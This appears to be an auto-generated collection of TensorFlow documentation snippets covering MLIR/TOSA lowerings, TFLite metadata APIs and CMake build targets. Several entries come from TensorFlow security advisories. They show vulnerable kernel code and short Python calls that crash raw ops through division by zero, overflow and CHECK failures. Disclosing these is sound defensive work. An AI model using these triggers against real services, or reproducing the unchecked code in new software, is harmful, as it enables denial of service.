  %ri_0 = "tf.TPUReplicatedInput"(%arg0, %arg2) : (!rtype, !rtype) -> !rtype
  %ri_1 = "tf.TPUReplicatedInput"(%arg1, %arg3) : (!rtype, !rtype) -> !rtype
  %pi = "tf.TPUPartitionedInput"(%ri_0, %ri_1) {_XlaSharding = "", device = "", partition_dim = -1 : i64} : (!rtype, !rtype) -> !rtype
  return %pi : !rtype
}
```

----------------------------------------

TITLE: Defining Fusion with Transpose and Add in MLIR HLO
DESCRIPTION: Defines an XLA fusion cluster (`f`) that takes a 2D floating-point parameter (`p0`), computes its transpose, and then adds the original parameter and the transposed result. This illustrates how indexing maps for fusion compose.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/indexing.md#_snippet_8

LANGUAGE: MLIR HLO
CODE:
```
f {
  p0 = f32[1000, 1000] parameter(0)
  transpose_p0 = f32[1000, 1000]{0, 1} transpose(p0), dimensions={1, 0}
  ROOT a0 = f32[1000, 1000] add(p0, transpose_p0)
}
```

----------------------------------------

TITLE: Lowering Floor Mod (MLIR/TOSA IR)
DESCRIPTION: Lowers a Floor Modulo operation to TOSA. It computes `(lhs / rhs) - floor(lhs / rhs)`. This sequence calculates the fractional part of the division `lhs / rhs` using `tosa.RECIPROCAL`, `tosa.MUL`, `tosa.FLOOR`, and `tosa.SUB` operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_11

LANGUAGE: MLIR/TOSA IR
CODE:
```
Value lower_floor_mod(Value %lhs, Value %rhs)
{
    %recip = tosa.RECIPROCAL(%rhs)
    %mul = tosa.MUL(%lhs, %recip)
    %floor = tosa.FLOOR(%mul)
    %output = tosa.SUB(%mul, %floor)
    return %output
}
```

----------------------------------------

TITLE: Finding Initializer Op Name in SavedModel C++
DESCRIPTION: This C++ snippet shows the vulnerable code within the `GetInitOp` function. It attempts to find an initializer operation name within nested map lookups based on the `SavedModel` protobuf structure. The vulnerability exists because it doesn't check if the second `.find` operation on `outputs()` returns a valid iterator before dereferencing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-040.md#_snippet_0

LANGUAGE: C++
CODE:
```
const auto& init_op_sig_it =
    meta_graph_def.signature_def().find(kSavedModelInitOpSignatureKey);
if (init_op_sig_it != sig_def_map.end()) {
  *init_op_name = init_op_sig_it->second.outputs()
                      .find(kSavedModelInitOpSignatureKey)
                      ->second.name();
  return OkStatus();
}
```

----------------------------------------

TITLE: Initializing ValueRange Instance in Python
DESCRIPTION: This method initializes a `ValueRange` instance. It requires a buffer (`buf`) and a position (`pos`) within the buffer to read the data from.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ValueRange.md#_snippet_2

LANGUAGE: Python
CODE:
```
Init(
    buf, pos
)
```

----------------------------------------

TITLE: Getting Root ImageProperties Object (Python)
DESCRIPTION: Class method to get the root `ImageProperties` object from a buffer. Useful for deserializing data. Takes a buffer (`buf`) and an optional byte offset.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageProperties.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod\nGetRootAs(\n    buf, offset=0\n)
```

----------------------------------------

TITLE: Demonstrating tf.raw_ops.ReverseSequence Vulnerability in Python
DESCRIPTION: This Python snippet demonstrates a security vulnerability in `tf.raw_ops.ReverseSequence`. It shows a call using an invalid negative value for `seq_dim`, which the advisory states can lead to stack overflow or denial of service due to missing validation. It requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-061.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input = tf.zeros([1, 1, 1], dtype=tf.int32)
seq_lengths = tf.constant([0], shape=[1], dtype=tf.int32)

tf.raw_ops.ReverseSequence(
    input=input, seq_lengths=seq_lengths, seq_dim=-2, batch_dim=0)

```

----------------------------------------

TITLE: Initializing ImagePropertiesT from Object in Python
DESCRIPTION: This class method creates a new `ImagePropertiesT` object by copying the data from an existing `imageProperties` object. It serves as a copy constructor or a method for converting between different object representations if applicable. The existing object provides all the necessary data for the new instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImagePropertiesT.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
InitFromObj(
    imageProperties
)
```

----------------------------------------

TITLE: Packing CustomMetadataT with Builder Python
DESCRIPTION: An instance method used to serialize the `CustomMetadataT` object using a provided builder object. This is part of the serialization process, likely for generating a buffer representation compatible with the schema.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadataT.md#_snippet_4

LANGUAGE: python
CODE:
```
Pack(
    builder
)
```

----------------------------------------

TITLE: Triggering Division by Zero in TensorFlow MaxPoolGradWithArgmax (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the division by zero vulnerability in `tf.raw_ops.MaxPoolGradWithArgmax`. It provides empty tensors with zero dimensions for inputs, including a batch dimension of zero, which the operation's implementation fails to handle correctly, leading to the error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-062.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)
grad = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)
argmax = tf.constant([], shape=[0], dtype=tf.int64)
ksize = [1, 1, 1, 1]
strides = [1, 1, 1, 1]

tf.raw_ops.MaxPoolGradWithArgmax(
  input=input, grad=grad, argmax=argmax, ksize=ksize, strides=strides,
  padding='SAME', include_batch_in_index=False)
```

----------------------------------------

TITLE: Triggering FractionalMaxPoolGrad Vulnerability Python
DESCRIPTION: Demonstrates how providing incorrectly sized inputs (specifically, `row_pooling_sequence` and `col_pooling_sequence` with shape [5] while other inputs have shapes [1,7,13,1]) to the `tf.raw_ops.FractionalMaxPoolGrad` operation can trigger a `CHECK` failure, potentially leading to a denial of service. Requires TensorFlow installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-110.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

overlapping = True
orig_input = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)
orig_output = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)
out_backprop = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)
row_pooling_sequence = tf.constant(0, shape=[5], dtype=tf.int64)
col_pooling_sequence = tf.constant(0, shape=[5], dtype=tf.int64)
tf.raw_ops.FractionalMaxPoolGrad(orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop, row_pooling_sequence=row_pooling_sequence, col_pooling_sequence=col_pooling_sequence, overlapping=overlapping)
```

----------------------------------------

TITLE: Check Buffer Identifier - TensorMetadata Class Method (Python)
DESCRIPTION: A class method that checks if a FlatBuffers buffer contains the file identifier associated with the TensorMetadata schema at a given offset. It can optionally check for size-prefixed buffers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadata.md#_snippet_16

LANGUAGE: python
CODE:
```
@classmethod
TensorMetadataBufferHasIdentifier(
    buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Identifying Root Cause in UnsortedSegmentJoin Kernel (C++)
DESCRIPTION: These lines from the TensorFlow C++ kernel implementation for `UnsortedSegmentJoin` show the root cause of the vulnerability. The code attempts to access the `num_segments` tensor as a scalar using `.scalar<T>()()`, which triggers an internal `CHECK` failure when the tensor is empty, leading to the crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-041.md#_snippet_1

LANGUAGE: c++
CODE:
```
const Tensor& num_segments_tensor = context->input(2);
auto num_segments = num_segments_tensor.scalar<NUM_SEGMENTS_TYPE>()();
```

----------------------------------------

TITLE: Initializing FeaturePropertiesT from Object in Python
DESCRIPTION: A class method to initialize a `FeaturePropertiesT` object from another existing `featureProperties` object. This is likely used for copying or converting object representations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/FeaturePropertiesT.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
InitFromObj(
    featureProperties
)
```

----------------------------------------

TITLE: Adding Associated Files to Subgraph Metadata in TFLite Support (Python)
DESCRIPTION: This is the function signature for adding associated files to TensorFlow Lite subgraph metadata. It takes a builder object and the associated files data as input to modify the metadata structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataAddAssociatedFiles.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataAddAssociatedFiles(\n    builder, associatedFiles\n)
```

----------------------------------------

TITLE: Value Representation for OpResolverType.AUTO in Python
DESCRIPTION: This snippet shows the internal representation of the `AUTO` value for `OpResolverType`. `AUTO` indicates the default op resolver used in TensorFlow Lite Python, which typically corresponds to the `BUILTIN` op resolver with optimized kernel implementations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/experimental/OpResolverType.md#_snippet_0

LANGUAGE: Python
CODE:
```
<OpResolverType.AUTO: 0>
```

----------------------------------------

TITLE: Configuring LIT Site Configuration (CMake)
DESCRIPTION: Configures the lit.site.cfg.py file, which is used by LIT to set up the test environment. It uses an input template file (.in) and outputs the generated configuration file, referencing the main LIT configuration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/tests/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
configure_lit_site_cfg(
        ${CMAKE_CURRENT_SOURCE_DIR}/lit.site.cfg.py.in
        ${CMAKE_CURRENT_BINARY_DIR}/lit.site.cfg.py
        MAIN_CONFIG
        ${CMAKE_CURRENT_SOURCE_DIR}/lit.cfg.py
)
```

----------------------------------------

TITLE: Creating ValueRangeEnd FlatBuffer Object in Python
DESCRIPTION: This snippet shows the function signature for creating a `ValueRangeEnd` object or adding it to a FlatBuffers builder. It takes a FlatBuffers builder object as input and is typically used internally to construct the complex metadata schema structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ValueRangeEnd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ValueRangeEnd(
    builder
)
```

----------------------------------------

TITLE: Demonstrating TensorFlow ImmutableConst Crash with String Type - Python
DESCRIPTION: This snippet demonstrates the vulnerability in `tf.raw_ops.ImmutableConst` by creating a temporary file, and then attempting to load its content as a `tf.string` tensor. When the operation is called with a non-integral type like `tf.string`, it triggers a write to the immutable memory region, causing a crash (segmentation fault). Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-031.md#_snippet_0

LANGUAGE: python
CODE:
```
>>> import tensorflow as tf
>>> with open('/tmp/test.txt','w') as f: f.write('a'*128)
>>> tf.raw_ops.ImmutableConst(dtype=tf.string,shape=2,
                              memory_region_name='/tmp/test.txt')
```

----------------------------------------

TITLE: Retrieving AssociatedFile Locale (Python)
DESCRIPTION: Retrieves the locale string associated with the `AssociatedFile`, indicating the language or region the file content is relevant for. This method takes no arguments. It returns a string representing the locale tag.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFile.md#_snippet_5

LANGUAGE: python
CODE:
```
Locale()
```

----------------------------------------

TITLE: TensorShape Constructor with CHECK in TensorFlow C++
DESCRIPTION: This C++ snippet from `tensor_shape.cc` shows the legacy `TensorShapeBase` constructor that is called. It relies on `TF_CHECK_OK` when initializing dimensions via `InitDims`. If `InitDims` returns a non-OK status (like an error due to overflow), this `CHECK` fails, terminating the program.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-012.md#_snippet_2

LANGUAGE: cpp
CODE:
```
template <class Shape>
TensorShapeBase<Shape>::TensorShapeBase(gtl::ArraySlice<int64> dim_sizes) {
  set_tag(REP16);
  set_data_type(DT_INVALID);
  TF_CHECK_OK(InitDims(dim_sizes));
}
```

----------------------------------------

TITLE: Vulnerable Axis Dimension Access (C++)
DESCRIPTION: This C++ snippet shows the specific line in the `QuantizeAndDequantizeV3` kernel implementation (`tensorflow/core/kernels/quantize_and_dequantize_op.cc`) that contains the vulnerability. It illustrates how the `axis_` attribute is used to access `input.dim_size(axis_)` without proper bounds checking for `axis_`, leading to the heap out-of-bounds read when `axis_` is invalid.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-040.md#_snippet_1

LANGUAGE: c++
CODE:
```
const int depth = (axis_ == -1) ? 1 : input.dim_size(axis_);
```

----------------------------------------

TITLE: Partial SparseCountSparseOutput Implementation - C++
DESCRIPTION: This C++ snippet shows the relevant part of the `SparseCountSparseOutput` kernel implementation where the vulnerability lies. It demonstrates how the first element of the 'shape' tensor (which corresponds to 'dense_shape' in the Python API) is used as `num_batches` to initialize a `BatchedMap`, without checking if the value is non-negative, leading to a segfault if it's negative.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-009.md#_snippet_1

LANGUAGE: cpp
CODE:
```
  bool is_1d = shape.NumElements() == 1;
  int num_batches = is_1d ? 1 : shape.flat<int64>()(0);
  ...
  auto per_batch_counts = BatchedMap<W>(num_batches);
```

----------------------------------------

TITLE: Initializing TensorGroupT Class Python
DESCRIPTION: The constructor for the `TensorGroupT` class. Use this to create a new instance of the TensorGroupT object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorGroupT.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorGroupT()
```

----------------------------------------

TITLE: Initializing TensorShape Dimensions and Adding Dim with Status (C++)
DESCRIPTION: These C++ snippets show the `InitDims` and `AddDimWithStatus` methods responsible for calculating the total number of elements in a tensor shape. The vulnerability stems from `MultiplyWithoutOverflow` returning a negative value on overflow, which `AddDimWithStatus` detects and signals via a non-OK Status, leading to the `CHECK`-fail when caught by the constructor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-071.md#_snippet_3

LANGUAGE: c++
CODE:
```
template <class Shape>
Status TensorShapeBase<Shape>::InitDims(gtl::ArraySlice<int64> dim_sizes) {
  ...
  Status status = OkStatus();
  for (int64 s : dim_sizes) {
    status.Update(AddDimWithStatus(internal::SubtleMustCopy(s)));
    if (!status.ok()) {
      return status;
    }
  }
}

template <class Shape>
Status TensorShapeBase<Shape>::AddDimWithStatus(int64 size) {
  ...
  int64 new_num_elements;
  if (kIsPartial && (num_elements() < 0 || size < 0)) {
    new_num_elements = -1;
  } else {
    new_num_elements = MultiplyWithoutOverflow(num_elements(), size);
    if (TF_PREDICT_FALSE(new_num_elements < 0)) {
        return errors::Internal("Encountered overflow when multiplying ",
                                num_elements(), " with ", size,
                                ", result: ", new_num_elements);
      }
  }
  ...
}
```

----------------------------------------

TITLE: Triggering TensorFlow AddManySparseToTensorsMap Overflow (Python)
DESCRIPTION: This Python snippet demonstrates an integer overflow vulnerability in the `tf.raw_ops.AddManySparseToTensorsMap` operation. By providing extremely large values (2^32) for the `sparse_shape` parameter, the internal creation of a `TensorShape` object triggers an integer overflow, leading to a `CHECK`-fail and denial of service. It requires the `tensorflow` and `numpy` libraries.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-012.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf
import numpy as np

tf.raw_ops.AddManySparseToTensorsMap(
    sparse_indices=[(0,0),(0,1),(0,2),(4,3),(5,0),(5,1)],
    sparse_values=[1,1,1,1,1,1],
    sparse_shape=[2**32,2**32],
    container='',
    shared_name='',
    name=None)
```

----------------------------------------

TITLE: Starting Input Tensor Metadata Vector (Python)
DESCRIPTION: This Python function call initiates the process of building a vector of input tensor metadata using a FlatBuffers builder. It takes the builder instance and the expected number of elements (tensors) as arguments, preparing the builder to append individual tensor metadata entries.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataStartInputTensorMetadataVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataStartInputTensorMetadataVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Vulnerable Division Logic in AllToAll Shape Inference (C++)
DESCRIPTION: This code excerpt from the TensorFlow C++ source shows the problematic logic in the `AllToAll` shape inference function (`tensorflow/core/ops/tpu_cross_replica_ops.cc`). It illustrates how the `split_count` attribute is retrieved and then used as a divisor in a loop, leading to a division by zero when `split_count` is 0. This requires access to the TensorFlow source code.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-176.md#_snippet_1

LANGUAGE: c++
CODE:
```
TF_RETURN_IF_ERROR(c->GetAttr("split_count", &split_count));
...
for (int32_t i = 0; i < rank; ++i) {
  ...
  dims[i] = c->MakeDim(c->Value(dims[i]) / split_count);
  ...
}
```

----------------------------------------

TITLE: Lowering tf.StridedSlice to TOSA MLIR
DESCRIPTION: Documents the lowering of the TensorFlow `tf.StridedSlice` operation, which extracts a strided slice, to the TOSA dialect's `lower_strided_slice_op`. It includes various masks as attributes to control slicing behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_41

LANGUAGE: MLIR
CODE:
```
%output = tf.StridedSlice(%input, %begin, %end, %strides) {begin_mask, end_mask, ellipsis_mask, new_axis_mask, shrink_axis_mask}
```

LANGUAGE: MLIR
CODE:
```
%output = lower_strided_slice_op(%input, %begin, %end, %strides, begin_mask, end_mask, ellipsis_mask, new_axis_mask, shrink_axis_mask)
```

----------------------------------------

TITLE: Creating Delegate Directory - ADB Shell
DESCRIPTION: Creates the target directory within the benchmark app's private file storage on the Android device using adb shell. The `run-as` command executes `mkdir -p` as the benchmark app user, ensuring the directory exists for placing delegate libraries.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/experimental/delegate_performance/android/README.md#_snippet_5

LANGUAGE: Shell
CODE:
```
adb shell run-as org.tensorflow.lite.benchmark.delegateperformance mkdir -p /data/data/org.tensorflow.lite.benchmark.delegateperformance/files
```

----------------------------------------

TITLE: Getting CustomMetadata Name in Python
DESCRIPTION: Retrieves the name string associated with this custom metadata entry. The name provides a human-readable identifier for the custom data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadata.md#_snippet_8

LANGUAGE: python
CODE:
```
Name()
```

----------------------------------------

TITLE: Iterating Sparse Tensor Elements in C++
DESCRIPTION: This C++ code snippet shows the loop responsible for iterating through the values and indices of a sparse tensor within the `SparseCountSparseOutput` operation. It accesses both the indices and values arrays in parallel using a single loop index `idx`, which highlights the vulnerability when the shapes of the underlying tensors are mismatched.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-018.md#_snippet_0

LANGUAGE: C++
CODE:
```
    for (int idx = 0; idx < num_values; ++idx) {
      int batch = is_1d ? 0 : indices_values(idx, 0);
      const auto& value = values_values(idx);
      // ...
    }
```

----------------------------------------

TITLE: Demonstrating to_dlpack Vulnerability Python
DESCRIPTION: This Python snippet demonstrates how to trigger the `dlpack.to_dlpack` vulnerability by passing a standard Python list instead of a TensorFlow tensor. The output includes a MemorySanitizer warning, indicating the use of uninitialized memory resulting from the incorrect handling of the non-tensor input in the C++ backend.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-023.md#_snippet_1

LANGUAGE: Python
CODE:
```
In [2]: tf.experimental.dlpack.to_dlpack([2])
==1720623==WARNING: MemorySanitizer: use-of-uninitialized-value
    #0 0x55b0ba5c410a in tensorflow::(anonymous namespace)::GetTensorFromHandle(TFE_TensorHandle*, TF_Status*) third_party/tensorflow/c/eager/dlpack.cc:46:7
    #1 0x55b0ba5c38f4 in tensorflow::TFE_HandleToDLPack(TFE_TensorHandle*, TF_Status*) third_party/tensorflow/c/eager/dlpack.cc:252:26
...

```

----------------------------------------

TITLE: Defining an HLO Broadcast Operation (HLO Pseudo-code)
DESCRIPTION: This snippet shows the HLO definition for a broadcast operation. It takes a 1D parameter tensor `p0` of shape `f32[20]` and broadcasts it to a 3D tensor `bc0` of shape `f32[10, 20, 30]` by replicating elements along dimensions 0 and 2, as indicated by `dimensions={1}`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/indexing.md#_snippet_0

LANGUAGE: HLO Pseudo-code
CODE:
```
p0 = f32[20] parameter(0)
bc0 = f32[10, 20, 30] broadcast(p0), dimensions={1}
```

----------------------------------------

TITLE: Vulnerable QuantizedMul Kernel Logic C++
DESCRIPTION: This C++ snippet shows the vulnerable code within the `VectorTensorMultiply` function of the `QuantizedMul` kernel implementation. The division by zero occurs at the line `const int64 vector_i = i % vector_num_elements;` when `vector_num_elements` is zero, which happens when an empty tensor is provided as input, leading to the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-017.md#_snippet_1

LANGUAGE: cpp
CODE:
```
template <class T, class Toutput>
void VectorTensorMultiply(const T* vector_data, int32 vector_offset,
                          int64 vector_num_elements, const T* tensor_data,
                          int32 tensor_offset, int64 tensor_num_elements,
                          Toutput* output) {
  for (int i = 0; i < tensor_num_elements; ++i) {
    const int64 vector_i = i % vector_num_elements;
    ...
  }
}
```

----------------------------------------

TITLE: Defining TensorShapeBase Constructor in TensorFlow (C++)
DESCRIPTION: This C++ code snippet presents the constructor for `TensorShapeBase`, which serves as the base class for `TensorShape`. It directly calls the `InitDims` method to process the dimension sizes, and importantly, uses `TF_CHECK_OK` to assert that the initialization succeeds, causing a crash upon integer overflow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-071.md#_snippet_2

LANGUAGE: c++
CODE:
```
template <class Shape>
TensorShapeBase<Shape>::TensorShapeBase(gtl::ArraySlice<int64> dim_sizes) {
  set_tag(REP16);
  set_data_type(DT_INVALID);
  TF_CHECK_OK(InitDims(dim_sizes));
}
```

----------------------------------------

TITLE: Calculating TFLite Segment Sum Output Shape (Vulnerable) - C++
DESCRIPTION: This C++ snippet from the TensorFlow Lite `segment_sum` kernel shows the logic for determining the output tensor's shape. It incorrectly uses the value of the last element in the `segment_ids` tensor (`max_index`) to set the size of the first output dimension, potentially leading to a large memory allocation and denial of service if `max_index` is excessively large.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-003.md#_snippet_0

LANGUAGE: C++
CODE:
```
  if (segment_id_size > 0) {
    max_index = segment_ids->data.i32[segment_id_size - 1];
  }
  TfLiteIntArray* output_shape = TfLiteIntArrayCreate(NumDimensions(data));
  output_shape->data[0] = max_index + 1;
  for (int i = 1; i < data_rank; ++i) {
    output_shape->data[i] = data->dims->data[i];
  }
  return context->ResizeTensor(context, output, output_shape);
```

----------------------------------------

TITLE: Updating TensorFlow Nightly Version Bash
DESCRIPTION: Executes a Python script inside the Docker container to update the TensorFlow version string to the nightly format (X.Y.Z.devYYYYMMDD). This is typically done before building nightly packages.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/README.md#_snippet_3

LANGUAGE: Bash
CODE:
```
docker exec tf python3 tensorflow/tools/ci_build/update_version.py --nightly
```

----------------------------------------

TITLE: Get Root RegexTokenizerOptions from Buffer Python
DESCRIPTION: Class method to initialize and return a `RegexTokenizerOptions` object from a FlatBuffers buffer at a specified offset. This is used to deserialize the options data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/RegexTokenizerOptions.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)
```

----------------------------------------

TITLE: Building model_runtime_info_proto Protobuf Target CMake
DESCRIPTION: Defines a second CMake library target `model_runtime_info_proto` and configures its C++ source and header generation from `model_runtime_info.proto` using `protoc`. Similar to the `profiling_info_proto` target, it adds generated files, links to the Protobuf library, and sets include paths. This target explicitly depends on the previously generated `profiling_info` files, indicating potential import dependencies between the .proto files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/profiling/proto/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
add_library(model_runtime_info_proto model_runtime_info.proto)
list(APPEND model_runtime_info_generated_files 
    ${TFLITE_GENERATED_HEADERS_DIR}/profiling/proto/model_runtime_info.pb.cc
    ${TFLITE_GENERATED_HEADERS_DIR}/profiling/proto/model_runtime_info.pb.h
)

# Generate model_runtime_info.pb.cc and model_runtime_info.pb.h from
# model_runtime_info.proto using protoc. Once the protobuf package version is
# upgraded, we can use protobuf_generate_cpp/protobuf_generate here directly.
add_custom_command(
    OUTPUT ${model_runtime_info_generated_files}
    COMMAND ${Protobuf_PROTOC_EXECUTABLE}
    ARGS --cpp_out=${CMAKE_BINARY_DIR} --proto_path=${TENSORFLOW_SOURCE_DIR} ${CMAKE_CURRENT_SOURCE_DIR}/model_runtime_info.proto
    DEPENDS ${Protobuf_PROTOC_EXECUTABLE} ${CMAKE_CURRENT_SOURCE_DIR}/model_runtime_info.proto ${profiling_info_generated_files}
)

set_source_files_properties(${model_runtime_info_generated_files} PROPERTIES GENERATED TRUE)
target_sources(model_runtime_info_proto PRIVATE ${model_runtime_info_generated_files})
target_link_libraries(model_runtime_info_proto protobuf::libprotobuf)
target_include_directories(model_runtime_info_proto PUBLIC ${CMAKE_BINARY_DIR})
```

----------------------------------------

TITLE: Adding Score Transformation to TFLite Score Calibration Options (Python)
DESCRIPTION: This Python function is part of the generated Flatbuffers code for the TFLite metadata schema. It is used to add the index of a score transformation object to the `ScoreCalibrationOptions` table being built using the provided Flatbuffers `builder`. The `scoreTransformation` parameter holds the Flatbuffer offset representing the score transformation object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreCalibrationOptionsAddScoreTransformation.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ScoreCalibrationOptionsAddScoreTransformation(
    builder, scoreTransformation
)
```

----------------------------------------

TITLE: Linking Libraries to Test Executable (CMake)
DESCRIPTION: Links the necessary libraries to the `aot_compiled_test` executable. This includes the main googletest library (`GTest::gtest_main`), which provides the test runner entry point, and the TensorFlow XLA AOT runtime library (`tf_xla_runtime`) built in the previous step.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/pip_package/xla_build/pip_test/CMakeLists.txt#_snippet_7

LANGUAGE: CMake
CODE:
```
target_link_libraries(aot_compiled_test GTest::gtest_main tf_xla_runtime)
```

----------------------------------------

TITLE: Lowering Quantize (MLIR/TOSA IR)
DESCRIPTION: Lowers a Quantize operation to TOSA. The quantization is performed by multiplying the input by the inverse scale, adding the zeropoint, and then casting the result to the output type. This implements the common asymmetric quantization formula `round(input / scale + zeropoint)` before casting.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_12

LANGUAGE: MLIR/TOSA IR
CODE:
```
Value lower_quantize_op(Type output_type, Value %input, float64 scale, int64 zeropoint)
{
    %const_scale = tosa.CONST() {value={scale}}
    %const_zp = tosa.CONST() {value={zeropoint}}
    %op1_mul_in_scale = tosa.MUL(%input, %const_scale)
    %op2_add_op1_zp = tosa.ADD(%op1_mul_in_scale, %const_zp)
    %op3_cast_op2 = tosa.CAST(%op2_add_op1_zp) // f32->%output.dtype
}
```

----------------------------------------

TITLE: Conditionally Add Performance Options Source on Non-Windows (CMake)
DESCRIPTION: This conditional block checks if the current system is *not* Windows. If true, it appends the source file for benchmark performance options to the `TFLITE_BENCHMARK_SRCS` list, enabling this feature on supported platforms.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
if(NOT "${CMAKE_SYSTEM_NAME}" STREQUAL "Windows")
  list(APPEND TFLITE_BENCHMARK_SRCS
    ${TFLITE_SOURCE_DIR}/tools/benchmark/benchmark_performance_options.cc
  )
endif()
```

----------------------------------------

TITLE: DepthwiseConv2DOptions FlatBuffer Schema (Original)
DESCRIPTION: This snippet shows the original definition of the DepthwiseConv2DOptions table in the FlatBuffer schema before the addition of dilation parameters. It defines basic options like padding, stride, depth multiplier, and activation function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_version.md#_snippet_0

LANGUAGE: FlatBuffers
CODE:
```
table DepthwiseConv2DOptions {
  padding:Padding;
  stride_w:int;
  stride_h:int;
